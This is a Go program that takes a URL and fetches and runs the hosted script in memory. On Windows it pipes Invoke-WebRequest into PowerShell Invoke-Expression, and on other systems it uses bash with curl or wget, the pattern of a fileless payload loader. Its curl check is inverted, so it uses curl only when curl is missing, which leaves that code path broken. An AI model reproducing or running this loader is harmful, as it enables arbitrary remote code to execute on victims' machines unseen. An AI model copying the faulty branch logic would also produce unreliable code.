package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	Shell string
	Args  []string
	Cmd   *exec.Cmd
}

func (c *Command) exec() {
	//fmt.Println(c.Shell, c.Args)
	c.Cmd = exec.Command(c.Shell, c.Args...)
	c.Cmd.Stdin = os.Stdin
	c.Cmd.Stdout = os.Stdout
	c.Cmd.Stderr = os.Stderr
	c.Cmd.Run()
}

func commandExists(cmd string) (string, bool) {
	path, err := exec.LookPath(cmd)
	if err != nil {
		return "", false
	}
	return path, true
}

func main() {
	var url string
	flag.StringVar(&url, "url", "", "url of hosted file")
	flag.Parse()

	url = strings.Trim(url, " ")
	c := Command{}

	if runtime.GOOS == "windows" {
		c.Shell = "powershell.exe"
		c.Args = []string{
			"-NoProfile", "-NonInteractive", "-c",
			fmt.Sprintf("Invoke-Expression([System.Text.Encoding]::ASCII.GetString((Invoke-WebRequest -Uri %s).Content))", url),
		}
	} else {
		if bash, exists := commandExists("bash"); exists {
			c.Shell = bash
			if curl, exists := commandExists("curl"); !exists {
				c.Args = []string{
					"-c", fmt.Sprintf("$(%s -s %s)", curl, url),
				}
			} else if wget, exists := commandExists("wget"); exists {
				c.Args = []string{
					"-c", fmt.Sprintf("$(%s %s --quiet -O -)", wget, url),
				}
			}
		} else {
			log.Fatal("bash was not found on this machine")
		}
	}
	c.exec()
}
